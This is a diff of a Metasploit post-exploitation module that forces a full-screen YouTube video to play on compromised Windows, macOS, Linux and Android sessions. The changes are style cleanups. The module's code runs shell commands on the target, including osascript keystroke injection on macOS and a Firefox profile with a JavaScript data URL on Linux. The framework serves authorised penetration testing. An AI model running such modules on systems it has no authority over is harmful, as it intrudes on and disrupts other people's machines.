@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,29 +7,28 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
   PLAY_OPTIONS = 'autoplay=1&loop=1&disablekb=1&modestbranding=1&iv_load_policy=3&controls=0&showinfo=0&rel=0'
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Multi Manage YouTube Broadcast',
-      'Description'   => %q{
-        This module will broadcast a YouTube video on specified compromised systems. It will play
-        the video in the target machine's native browser in full screen mode. The VID datastore
-        option is the "v" parameter in a YouTube video's URL.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'win', 'osx', 'linux', 'android' ],
-      'SessionTypes'  => [ 'shell', 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Multi Manage YouTube Broadcast',
+                      'Description'   => %q(
+                        This module will broadcast a YouTube video on specified compromised systems. It will play
+                        the video in the target machine's native browser in full screen mode. The VID datastore
+                        option is the "v" parameter in a YouTube video's URL.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'sinn3r'],
+                      'Platform'      => [ 'win', 'osx', 'linux', 'android' ],
+                      'SessionTypes'  => [ 'shell', 'meterpreter' ]))
 
     register_options(
       [
         OptString.new('VID', [true, 'The video ID to the YouTube video'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   #
@@ -37,9 +37,9 @@ class MetasploitModule < Msf::Post
   def osx_start_video(id)
     url = "https://youtube.googleapis.com/v/#{id}?fs=1&#{PLAY_OPTIONS}"
     script = ''
-    script << %Q|osascript -e 'tell application "Safari" to open location "#{url}"' |
-    script << %Q|-e 'activate application "Safari"' |
-    script << %Q|-e 'tell application "System Events" to key code {59, 55, 3}'|
+    script << %(osascript -e 'tell application "Safari" to open location "#{url}"' )
+    script << %(-e 'activate application "Safari"' )
+    script << %(-e 'tell application "System Events" to key code {59, 55, 3}')
 
     begin
       cmd_exec(script)
@@ -64,7 +64,6 @@ class MetasploitModule < Msf::Post
     true
   end
 
-
   #
   # The Linux version uses Firefox
   # TODO: Try xdg-open?
@@ -73,10 +72,10 @@ class MetasploitModule < Msf::Post
     begin
       # Create a profile
       profile_name = Rex::Text.rand_text_alpha(8)
-      o = cmd_exec(%Q|firefox --display :0 -CreateProfile "#{profile_name} /tmp/#{profile_name}"|)
+      o = cmd_exec(%(firefox --display :0 -CreateProfile "#{profile_name} /tmp/#{profile_name}"))
 
       # Add user-defined settings to profile
-      s = %Q|
+      s = %|
       user_pref("dom.disable_open_during_load", false);
       user_pref("browser.shell.checkDefaultBrowser", false);
       |
@@ -84,7 +83,7 @@ class MetasploitModule < Msf::Post
 
       # Start the video
       url = "https://youtube.googleapis.com/v/#{id}?fs=1&#{PLAY_OPTIONS}"
-      data_js = %Q|"data:text/html,<script>window.open('#{url}','','width:100000px;height:100000px');</script>"|
+      data_js = %|"data:text/html,<script>window.open('#{url}','','width:100000px;height:100000px');</script>"|
       joe = "firefox --display :0 -p #{profile_name} #{data_js} &"
       cmd_exec("/bin/sh -c #{joe.shellescape}")
     rescue EOFError
@@ -130,7 +129,5 @@ class MetasploitModule < Msf::Post
       print_error("#{peer} - Unable to start the video")
       return
     end
-
   end
-
 end
